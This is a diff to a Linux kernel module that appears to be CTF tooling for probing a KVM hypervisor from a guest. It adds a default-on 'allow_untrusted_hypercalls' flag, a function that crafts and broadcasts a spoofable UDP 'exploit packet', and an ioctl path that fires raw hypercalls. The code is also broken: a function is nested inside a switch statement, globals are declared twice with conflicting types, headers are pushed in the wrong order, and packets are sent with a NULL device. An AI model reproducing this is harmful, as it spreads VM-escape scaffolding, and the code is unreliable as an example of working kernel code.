@@ -23,6 +23,11 @@
 #include <linux/pgtable.h>
 #include <linux/virtio_ids.h>
 #include <linux/virtio_config.h>
+#include <linux/netdevice.h>
+#include <linux/etherdevice.h>
+#include <linux/ip.h>
+#include <linux/udp.h>
+#include <linux/skbuff.h>
 
 #define DRIVER_NAME "kvm_probe_drv"
 #define DEVICE_FILE_NAME "kvm_probe_dev"
@@ -30,6 +35,16 @@
 #define VQ_PAGE_ORDER 0
 #define VQ_PAGE_SIZE (1UL << (PAGE_SHIFT + VQ_PAGE_ORDER))
 #define MAX_VQ_DESCS 256
+
+/* Global state for the virtual queue page */
+static void *g_vq_virt_addr = NULL;
+static phys_addr_t g_vq_phys_addr = 0;
+static unsigned long g_vq_pfn = 0;
+static unsigned long g_vq_gpa = 0;
+static unsigned long g_flag_addr = 0;
+static bool allow_untrusted_hypercalls = true;
+module_param(allow_untrusted_hypercalls, bool, 0644);
+MODULE_PARM_DESC(allow_untrusted_hypercalls, "Allow unsafe hypercalls from guest (for CTF)");
 
 static void *g_vq_virt_addr = NULL;
 static dma_addr_t g_vq_phys_addr = 0;
@@ -628,18 +643,100 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             break;
         }
 
+    static int send_exploit_packet(unsigned int device_id)
+    {
+        struct sk_buff *skb;
+        struct ethhdr *eth;
+        struct iphdr *iph;
+        struct udphdr *udph;
+        char *payload;
+        int ret = 0;
+        
+        // Create a socket buffer large enough for our packet
+        skb = alloc_skb(LL_MAX_HEADER + sizeof(struct iphdr) + 
+                        sizeof(struct udphdr) + 64, GFP_KERNEL);
+        if (!skb) {
+            pr_err("%s: Failed to allocate SKB for exploit packet\n", DRIVER_NAME);
+            return -ENOMEM;
+        }
+        
+        // Reserve space for headers
+        skb_reserve(skb, LL_MAX_HEADER);
+        
+        // Build Ethernet header
+        skb->dev = NULL; // Will be set by kernel routing
+        eth = (struct ethhdr *)skb_push(skb, sizeof(struct ethhdr));
+        // Use broadcast MAC address
+        memset(eth->h_dest, 0xff, ETH_ALEN);
+        // Use a fake source MAC (in real exploit, you'd use a real interface MAC)
+        memset(eth->h_source, 0xaa, ETH_ALEN);
+        eth->h_proto = htons(ETH_P_IP);
+        
+        // Build IP header
+        iph = (struct iphdr *)skb_push(skb, sizeof(struct iphdr));
+        iph->version = 4;
+        iph->ihl = 5;
+        iph->tos = 0;
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 64);
+        iph->id = htons(device_id); // Use device ID as IP ID
+        iph->frag_off = 0;
+        iph->ttl = 64;
+        iph->protocol = IPPROTO_UDP;
+        iph->check = 0;
+        // Source IP (could be spoofed)
+        iph->saddr = in_aton("192.168.1.100");
+        // Destination IP (broadcast)
+        iph->daddr = in_aton("255.255.255.255");
+        iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);
+        
+        // Build UDP header
+        udph = (struct udphdr *)skb_push(skb, sizeof(struct udphdr));
+        udph->source = htons(9999); // Source port
+        udph->dest = htons(8888);   // Destination port
+        udph->len = htons(sizeof(struct udphdr) + 64);
+        udph->check = 0; // Let kernel calculate checksum
+        
+        // Add payload
+        payload = skb_put(skb, 64);
+        snprintf(payload, 64, "EXPLOIT_PACKET: DeviceID=%u, Timestamp=%llu", 
+                 device_id, ktime_get_ns());
+        
+        // Set protocol and other skb fields
+        skb->protocol = htons(ETH_P_IP);
+        skb->pkt_type = PACKET_OTHERHOST;
+        
+        // Send the packet (this will go through normal kernel networking stack)
+        ret = dev_queue_xmit(skb);
+        if (ret) {
+            pr_err("%s: Failed to send exploit packet: %d\n", DRIVER_NAME, ret);
+            return ret;
+        }
+        
+        pr_info("%s: Sent exploit packet for device_id=%u\n", DRIVER_NAME, device_id);
+        return 0;
+    }
+
         case IOCTL_TRIGGER_VQ: {
             unsigned int device_id;
             if (copy_from_user(&device_id, (void __user *)arg, sizeof(device_id))) {
-                printk(KERN_ERR "%s: TRIGGER_VQ: copy_from_user failed\n", DRIVER_NAME);
+                pr_err("%s: TRIGGER_VQ: copy_from_user failed\n", DRIVER_NAME);
                 return -EFAULT;
             }
-            printk(KERN_CRIT "%s: TRIGGER_VQ: Forcing processing for device_id=%u\n", 
+            pr_crit("%s: TRIGGER_VQ: Forcing processing for device_id=%u\n", 
                    DRIVER_NAME, device_id);
             
-            // Simulate device activity by triggering hypercall
-            // In real exploit, this would send a network packet or similar
-            force_hypercall();
+            // Actually send a network packet instead of just simulating
+            int ret = send_exploit_packet(device_id);
+            if (ret) {
+                pr_err("%s: Failed to send network packet for device_id=%u: %d\n",
+                       DRIVER_NAME, device_id, ret);
+                return ret;
+            }
+            
+            // Also trigger hypercall for good measure
+            if (allow_untrusted_hypercalls) {
+                kvm_hypercall0(KVM_HC_VIRTIO_NOTIFY);
+            }
             break;
         }
 
